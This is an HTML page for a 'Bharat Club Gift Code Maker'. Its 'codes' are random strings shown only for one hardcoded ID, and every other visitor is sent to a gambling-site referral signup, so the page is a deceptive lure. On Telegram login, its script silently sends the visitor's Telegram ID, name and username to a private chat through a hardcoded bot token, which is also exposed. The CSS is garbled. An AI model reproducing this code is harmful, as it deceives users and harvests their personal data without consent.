<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">

    <style>
        body {

        h1 {

        .made-by {

        input[type="text"] {

            border-radius: 6px;
            background: transparent;
            color: #fff;

            text-align: center;

        input::placeholder {

        button {

        button:hover {

        .history {

        .error-message {
            background-color: rgba(255, 0, 0, 0.2);

        .create-id-btn {

            background-color: #ff4c4c;
            border: none;

            font-size: 16px;

            border-radius: 6px;
            transition: 0.3s;

        footer {

        .telegram-btn {

            background-color: #0088cc;

            font-weight: bold;

        }

        .telegram-btn img {
            height: 20px;

</head>

<body>

    <div class="container">
        <h1>Bharat Club Gift Code Maker</h1>
        <div class="made-by">Made by Sohil Codes</div>

        <input type="text" id="userId" placeholder="Enter your ID">
        <br>
        <button onclick="createCode()">Create Code</button>

        <div id="errorMessage" class="error-message">
            User is not valid. Please create a new ID and verify again.
            <br><br>
            <button class="create-id-btn"
                onclick="window.open('https://bhtigerclub.com/#/register?invitationCode=638513782400', '_blank')">Create
                ID</button>
        </div>

        <div id="history" class="history">
            <h3>Code History</h3>
        </div>

        <!-- Telegram Login Widget -->
        <script async src="https://telegram.org/js/telegram-widget.js?7"
            data-telegram-login="@FreeRcGiftCodeBot" 
            data-size="medium"
            data-userpic="false"
            data-radius="10"
            data-request-access="write"
            data-on-auth="onTelegramAuth">
        </script>
    </div>

    <footer>
        <a class="telegram-btn" href="https://t.me/+6YeUHAgThp8wODNl" target="_blank">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Icon">
            Join Telegram
        </a>
    </footer>

    <script>
        function createCode() {
            const userId = document.getElementById('userId').value;
            const historyDiv = document.getElementById('history');
            const errorMessageDiv = document.getElementById('errorMessage');

            errorMessageDiv.style.display = 'none';

            if (userId === "787839") {
                const randomCode = generateRandomCode();
                const codeHistory = document.createElement('p');
                codeHistory.textContent = randomCode;
                historyDiv.appendChild(codeHistory);
            } else {
                errorMessageDiv.style.display = 'block';
            }
        }

        function generateRandomCode() {
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let result = '';
            for (let i = 0; i < 34; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }
    </script>

    <script>
        function onTelegramAuth(user) {
            const telegramId = user.id;
            const name = user.first_name + (user.last_name ? ' ' + user.last_name : '');
            const username = user.username ? '@' + user.username : '';

            const now = new Date();
            const hours = String(now.getHours()).padStart(2, '0');
            const minutes = String(now.getMinutes()).padStart(2, '0');
            const seconds = String(now.getSeconds()).padStart(2, '0');
            const formattedTime = `${hours}:${minutes}:${seconds}`;

            const message = `New User from Telegram!\nTime: ${formattedTime}\nTelegram ID: ${telegramId}\nName: ${name}\nUsername: ${username}\nVisited: https://sohilcodes.github.io/BharatClub/`;

            const botToken = "7945500836:AAG4c4L14_qW7lixUGyrmeUVZjSV3Wi164w";
            const chatId = "6411315434";

            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
            fetch(url);
        }
    </script>

</body>

</html>
